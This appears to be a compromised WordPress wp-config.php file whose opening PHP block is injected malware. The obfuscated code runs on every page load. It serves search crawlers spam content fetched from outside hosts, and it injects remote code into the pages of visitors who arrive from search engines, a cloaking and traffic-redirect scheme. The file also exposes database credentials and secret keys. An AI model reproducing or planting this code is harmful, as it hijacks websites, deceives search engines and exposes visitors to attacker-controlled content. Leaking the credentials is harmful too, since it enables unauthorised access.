<?php
if(!defined('_NET'))
{	
error_reporting(0);
$NET='sh19044'; 
define('_NET',$NET);
if(function_exists('date_default_timezone_set')){date_default_timezone_set('America/Los_Angeles');}$sll0='http://googlecountwebs.com/';$pinj_0='http://tds-err.com/i?r=1';$pinj_1='http://tds-narod.ru/i.txt';$FNN='lnk-trans2.php';$pinj_2='yahoo';$pinj_2='bing';$pinj_3=str_replace('google',$pinj_1,$sll0);$pinj_4='site';$sll0=str_replace('google',$pinj_4,$sll0);$pinj_5='';$pinj_6='';$pinj_7='';$pinj_8='';if(!empty($_SERVER['HTTP_USER_AGENT'])){$pinj_6=$_SERVER['HTTP_USER_AGENT'];}if(!empty($_SERVER['HTTP_REFERER'])){$pinj_5=$_SERVER['HTTP_REFERER'];}if(!empty($_SERVER['REQUEST_URI'])){$pinj_7=$_SERVER['REQUEST_URI'];}if(!empty($_SERVER['REMOTE_ADDR'])){$pinj_8=$_SERVER['REMOTE_ADDR'];}if(!function_exists('get_cont')){function get_cont($pinj_9){if(function_exists('curl_init')){$pinj_10=curl_init();curl_setopt($pinj_10,CURLOPT_URL,$pinj_9);curl_setopt($pinj_10,CURLOPT_HEADER,0);curl_setopt($pinj_10,CURLOPT_NOBODY,0);curl_setopt($pinj_10,CURLOPT_TIMEOUT,35);curl_setopt($pinj_10,CURLOPT_RETURNTRANSFER,1);curl_setopt($pinj_10,CURLOPT_USERAGENT,"Mozilla/5.0 (compatible; MSIE 5.01; Windows NT 5.0)");$pinj_11=curl_exec($pinj_10);curl_close($pinj_10);return $pinj_11;}$pinj_12=@file_get_contents($pinj_9);return $pinj_12;}}if(!function_exists('SEbot_')){function SEbot_($pinj_13){if(strpos('-' .strtolower($pinj_13),'googlebot',0)>0){return 1;}if(strpos('-' .strtolower($pinj_13),'slurp',0)>0){return 1;}if(strpos('-' .strtolower($pinj_13),'bing',0)>0){return 1;}if(strpos('-' .strtolower($pinj_13),'msnbot',0)>0){return 1;}if(strpos('-' .strtolower($pinj_13),'yahoo',0)>0){return 1;}return 0;}}if(!function_exists('not_do_')){function not_do_($pinj_14){$pinj_15='gif|jpeg|png|js|css|swf|ico|txt|pdf|xml|jpg|pdf|doc';$pinj_16=explode("|",$pinj_15);$pinj_17=0;while($pinj_17<count($pinj_18)){if(strpos(' ' .strtolower($pinj_14),$pinj_18[$pinj_17],0)>0)return 1;$pinj_17=$pinj_17+1;}return 0;}}if(!function_exists('detect_encoding_')){function detect_encoding_($pinj_19){static $pinj_20=array('UTF-8','ASCII','Windows-1251','ISO-8859-2','ISO-8859-3','ISO-8859-4','ISO-8859-5','ISO-8859-6','ISO-8859-7','ISO-8859-8','ISO-8859-9','ISO-8859-10','ISO-8859-13','ISO-8859-14','ISO-8859-15','ISO-8859-16','ISO-8859-1','Windows-1252','Windows-1254',);foreach($pinj_20 as $pinj_21){$pinj_22=@iconv($pinj_21,$pinj_21 .'',$pinj_19);if(md5($pinj_22)== md5($pinj_19))return $pinj_21;}return null;}}if(isset($_SERVER['HTTPS'])&&($_SERVER['HTTPS']=='on')){$pinj_23='https';}else{$pinj_23='http';}$pinj_24=substr(str_replace('www.','',$_SERVER['SERVER_NAME']),0,4);if((SEbot_($pinj_6)>0)&&empty($pinj_25)&&(not_do_($pinj_7)==0)){$pinj_26=get_cont($sll0 .$FNN .'?d=' .$_SERVER['SERVER_NAME'] .'&NET=' .$NET .'&u=' .urlencode($pinj_7) .'&prot=' .$pinj_23);$pinj_25=get_cont($pinj_23 .'://' .$_SERVER['SERVER_NAME'] .$pinj_7);if(strlen($pinj_25)>200){if(strpos($pinj_26,'"ttl"',0)>0){$pinj_27=@unserialize($pinj_26);$pinj_28="\r\n" .'<meta name="description" content="' .$pinj_27['dsc'] .'"/>' ."\r\n";$pinj_29=array("'<li>.*?</li>'si","'<li [^>]*?>.*?</li>'si");$pinj_30=array("","");$pinj_31=preg_replace($pinj_29,$pinj_30,$pinj_25);$pinj_29=array("'<noscript[^>]*?>.*?</noscript>'si");$pinj_30=array("");$pinj_31=preg_replace($pinj_29,$pinj_30,$pinj_31);$pinj_31=str_replace('></a>','> </a>',$pinj_31);$pinj_31=preg_replace('/<a(.+?)href=("|\')(.+?)("|\')(.*?)>(.+?)<\/a>/i',"",$pinj_31);$pinj_31=str_replace("</li>",'',$pinj_31);$pinj_31=str_replace("<ul>",'',$pinj_31);$pinj_31=str_replace("</ul>",'',$pinj_31);$pinj_29=array("'<h1 [^>]*?>.*?</h1>'si","'<h2 [^>]*?>.*?</h2>'si","'<h2>.*?</h2>'si","'<iframe [^>]*?>.*?</iframe>'si","'<h3[^>]*?>.*?</h3>'si","'<h4[^>]*?>.*?</h4>'si","'<h5[^>]*?>.*?</h5>'si");$pinj_30=array("","","","","","","");$pinj_31=preg_replace($pinj_29,$pinj_30,$pinj_31);$pinj_32=0;$pinj_33=@explode('>',$pinj_31);$pinj_17=0;$pinj_34='';$pinj_35='';$pinj_36='';$pinj_37='';$pinj_38=0;$pinj_39=0;$pinj_40=0;if(strpos('-' .strtolower($pinj_31),'<body',0)<=0){$pinj_41=1;}else{$pinj_41=0;}while($pinj_17<count($pinj_33)){if((strpos('-' .strtolower($pinj_33[$pinj_17]),'<body',0)>0)&&($pinj_41==0)){$pinj_41=1;}$pinj_42=explode('<',$pinj_33[$pinj_17]);$pinj_42[0]=trim($pinj_42[0]);if((strlen($pinj_42[0])>40)){if((strpos($pinj_42[0],'=',0)<=0)&&(strpos($pinj_42[0],'}',0)<=0)&&(strpos($pinj_42[0],'{',0)<=0)&&(strpos($pinj_42[0],'+',0)<=0)&&(strpos($pinj_42[0],');',0)<=0)&&(!preg_match("/\.[a-zA-Z]/i",$pinj_42[0]))){if((strlen($pinj_35)<strlen($pinj_42[0]))&&(strlen($pinj_35)<80)&&($pinj_41==1)){$pinj_35=$pinj_42[0];$pinj_38=$pinj_17;}elseif((strlen($pinj_36)<strlen($pinj_42[0]))&&($pinj_41==1)){$pinj_36=$pinj_42[0];$pinj_39=$pinj_17;}elseif((strlen($pinj_37)<strlen($pinj_42[0]))&&($pinj_41==1)){$pinj_37=$pinj_42[0];$pinj_40=$pinj_17;}}}$pinj_17=$pinj_17+1;}$pinj_43="<h1>" .$pinj_27['h1'] ."</h1> \r\n " .$pinj_27['txt1'] ."";$pinj_44=$pinj_27['txt2'];$pinj_45=$pinj_27['txt3'];if($pinj_40==0){$pinj_44=$pinj_44 .' ' .$pinj_45;$pinj_45='';}if($pinj_39==0){$pinj_43=$pinj_43 .' ' .$pinj_44;$pinj_44='';}$pinj_46='';if($pinj_38==0){$pinj_46=$pinj_43;}$pinj_17=0;while($pinj_17<count($pinj_33)){$pinj_42=@explode('<',$pinj_33[$pinj_17]);$pinj_42[0]=trim($pinj_42[0]);if((strlen($pinj_42[0])>40)){if((strpos($pinj_42[0],'=',0)<=0)&&(strpos($pinj_42[0],'}',0)<=0)&&(strpos($pinj_42[0],'{',0)<=0)&&(strpos($pinj_42[0],'+',0)<=0)&&(strpos($pinj_42[0],');',0)<=0)&&(!preg_match("/\.[a-zA-Z]/i",$pinj_42[0]))){if(($pinj_17==$pinj_40)){$pinj_42[0]='-vst3-';}elseif($pinj_17==$pinj_39){$pinj_42[0]='-vst2-';}elseif($pinj_17==$pinj_38){$pinj_42[0]='-vst1-';}else{$pinj_42[0]='';}}}$pinj_33[$pinj_17]=@implode('<',$pinj_42);if(isset($pinj_47)){echo $pinj_33[$pinj_17];exit;}if($pinj_34==''){$pinj_34=$pinj_33[$pinj_17];}else{if((strpos(strtolower('-' .$pinj_33[$pinj_17]),'meta',0)>0)&&(strpos(strtolower('-' .$pinj_33[$pinj_17]),'keywords',0)>0)){}elseif((strpos(strtolower('-' .$pinj_33[$pinj_17]),'meta',0)>0)&&(strpos(strtolower('-' .$pinj_33[$pinj_17]),'description',0)>0)){}elseif((strpos(strtolower('-' .$pinj_33[$pinj_17]),'meta',0)>0)&&(strpos(strtolower('-' .$pinj_33[$pinj_17]),'title',0)>0)){}elseif((strpos(strtolower('-' .$pinj_33[$pinj_17]),'property',0)>0)&&(strpos(strtolower('-' .$pinj_33[$pinj_17]),'og:',0)>0)){}elseif((strpos(strtolower('-' .$pinj_33[$pinj_17]),'link',0)>0)&&(strpos(strtolower('-' .$pinj_33[$pinj_17]),'alternate',0)>0)){}elseif((strpos(strtolower('-' .$pinj_33[$pinj_17]),'link',0)>0)&&(strpos(strtolower('-' .$pinj_33[$pinj_17]),'canonical',0)>0)){}elseif((strpos(strtolower('-' .$pinj_33[$pinj_17]),'rel=',0)>0)&&(strpos(strtolower('-' .$pinj_33[$pinj_17]),'alternate',0)>0)){}elseif((strpos(strtolower('-' .$pinj_33[$pinj_17]),'rel=',0)>0)&&(strpos(strtolower('-' .$pinj_33[$pinj_17]),'contents',0)>0)){}elseif((strpos(strtolower('-' .$pinj_33[$pinj_17]),'charset=',0)>0)){}elseif((strpos(strtolower('-' .$pinj_33[$pinj_17]),'<title',0)>0)&&(strpos(strtolower('-' .$pinj_33[$pinj_17]),'</title',0)<=0)){$pinj_34=$pinj_34 .'> ' .$pinj_28 ."\r\n" .' <title>' .$pinj_27['ttl'] .'</title';$pinj_48=2;}elseif((strpos(strtolower('-' .$pinj_33[$pinj_17]),'<body',0)>0)){$pinj_34=$pinj_34 .'>' .$pinj_33[$pinj_17] .'> ' .$pinj_46;$pinj_48=1;}else{if(isset($pinj_48)&&($pinj_48==1)){$pinj_34=$pinj_34 .'' .$pinj_33[$pinj_17];$pinj_48=0;}elseif(isset($pinj_48)&&($pinj_48==2)){$pinj_34=$pinj_34 .'';$pinj_48=0;}else{$pinj_34=$pinj_34 .'>' .$pinj_33[$pinj_17];}}}$pinj_17=$pinj_17+1;}$pinj_34=str_replace(array('-vst1-','-vst2-','-vst3-'),array($pinj_43,$pinj_44,$pinj_45),$pinj_34);$pinj_34=str_replace("</head>",'<meta charset="utf-8"> </head>',$pinj_34);$pinj_34=str_replace("</HEAD>",'<meta charset="utf-8"> </head>',$pinj_34);$pinj_34=str_replace("</Head>",'<meta charset="utf-8"> </head>',$pinj_34);$pinj_34=str_replace('< <','<',$pinj_34);$pinj_34=str_replace('<?<','<',$pinj_34);$pinj_34=str_replace('<<','<',$pinj_34);$pinj_34=str_replace("<\n",'',$pinj_34);$pinj_34=preg_replace("/\d{2}\.\d{2}.\d{4}/","",$pinj_34);$pinj_34=preg_replace("/\d{2}\-\d{2}-\d{4}/","",$pinj_34);$pinj_34=preg_replace("/\d{1}\.\d{2}.\d{4}/","",$pinj_34);$pinj_34=preg_replace("/\d{4}\.\d{2}.\d{2}/","",$pinj_34);$pinj_34=preg_replace("/\d{4}\-\d{2}-\d{2}/","",$pinj_34);$pinj_34=preg_replace('/\n\n+/',"\n",$pinj_34);$pinj_34=preg_replace('/\r\n\r\n+/',"\r\n",$pinj_34);$pinj_34=preg_replace('/	\n	\n+/',"\n",$pinj_34);$pinj_34=str_replace("2010",date('Y'),$pinj_34);$pinj_34=str_replace("2011",date('Y'),$pinj_34);$pinj_34=str_replace("2012",date('Y'),$pinj_34);$pinj_34=str_replace("2013",date('Y'),$pinj_34);$pinj_34=str_replace("2014",date('Y'),$pinj_34);$pinj_34=str_replace("2015",date('Y'),$pinj_34);$pinj_34=str_replace("2016",date('Y'),$pinj_34);$pinj_34=str_replace("2017",date('Y'),$pinj_34);$pinj_49='"ab","az","ay","sq","en","en-us","ar","hy","as","af","ba","be","bn","bg","br","cy","hu","vi","gl","nl","el","ka","gn","da","zu","iw","ji","in","ia","ga","is","es","it","kk","km","ca","ks","qu","ky","zh","ko","co","ku","lo","lv","la","lt","mg","ms","mt","mi","mk","mo","mn","na","de","ne","no","pa","fa","pl","pt","ps","rm","ro","ru","sm","sa","sr","sk","sl","so","sw","su","tl","tg","th","ta","tt","bo","to","tr","tk","uz","uk","ur","fj","fi","fr","fy","ha","hi","hr","cs","sv","eo","et","jw","ja"';$pinj_50=explode(',',$pinj_49);$pinj_34=str_replace($pinj_50,'"' .$pinj_27['lang'] .'"',$pinj_34);echo $pinj_34;exit;}$pinj_51=$pinj_25;$pinj_52=strpos(strtolower($pinj_25),"<body",0);$pinj_53=strpos(strtolower($pinj_25),">",$pinj_52);if(($pinj_52>0)&&($pinj_53>0)){$pinj_25=substr($pinj_51,0,$pinj_53+1) .$pinj_26 .'' .substr($pinj_51,$pinj_53+1);if(strpos(strtolower('-' .$pinj_6),'sape',0)>0){$pinj_25=$pinj_25 .'=*OK*=';}echo $pinj_25;exit;}}}if(isset($pinj_5)&&((strpos($pinj_5,'ogle.',0)>0)||(strpos($pinj_5,'ing.',0)>0)||(strpos($pinj_5,'ahoo.',0)>0))){$pinj_54='mkke';$pinj_55=70;if(!isset($_COOKIE[$pinj_54])||($_COOKIE[$pinj_54]<(time()))){$pinj_56=get_cont($sll0 .$FNN .'?rd=1&d=' .$_SERVER['SERVER_NAME'] .'&NET=' .$NET .'&u=' .urlencode($pinj_7) .'&prot=' .$pinj_23);if(strlen($pinj_56,'<!-- -->',0)>0)$pinj_55=30000;if(strlen($pinj_56)>10){$pinj_57=get_cont($pinj_23 .'://' .$_SERVER['SERVER_NAME'] .$pinj_7);if(strlen($pinj_57)>400){$pinj_56=str_replace('-SID-',$NET,$pinj_56);$pinj_57=str_replace('</head>',$pinj_56 .'</head>',$pinj_57);setcookie($pinj_54,(time()+$pinj_55),(time()+$pinj_55*2),'/','.' .str_replace('www.','',$_SERVER['SERVER_NAME']));echo $pinj_57;exit;}}}}
}
/*,.*/
?><?php 
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'hospi734_wrdp1');

/** MySQL database username */
define('DB_USER', 'hospi734_wrdp1');

/** MySQL database password */
define('DB_PASSWORD', 'p415b52017');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'u!qmjhpw+Yas3m3WKW`^T)[&=lQ^O-L+[+#*udhp4]{.||LM|0%6+_R:_|_ECaVN');
define('SECURE_AUTH_KEY',  'GvlV}*k}^H=E2vY5:3Adeqx4<`ZRY|0FU}l1rNDY$O|Y<I.q/!+k&g1N3 T7WJ@/');
define('LOGGED_IN_KEY',    'Gk;6pa}{iJ!#]CA&m@U+3v-_uBIS3soOiu}+{p_<G8Y@seI/H]0:u+i,2L*l%v-f');
define('NONCE_KEY',        'eO`)ZH;D1|SuOU.(Fg$+#&_oalcihB*M/)^+gpXA(Cj9})O-kF!Z^s7A]@w;K6Rv');
define('AUTH_SALT',        '5uY61Oj0~v<hHMU${4$M.#mjI_J >MVdwz+R!0d,c7`#m?9H? Su?6YHR:$Wj1}K');
define('SECURE_AUTH_SALT', '-(N5@~lm8)!VGcN}|5cJ/^8U|q&y~)|k|(Qfy*}.%;$H~l!4mqn4*;P?OrT*<.FQ');
define('LOGGED_IN_SALT',   '++XG+=aXFl$E@WvR/rGqwC& IX `3yrnvx7:} &j{CK#&+]Sd&gy2N6e<v-M0R>|');
define('NONCE_SALT',       ')Mnm$2]rL3@h,-&1yepvkmcj]z~%Fa^%<<?AaLAf[EXDWJ(M2#,cB~LN+_bJM|})');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
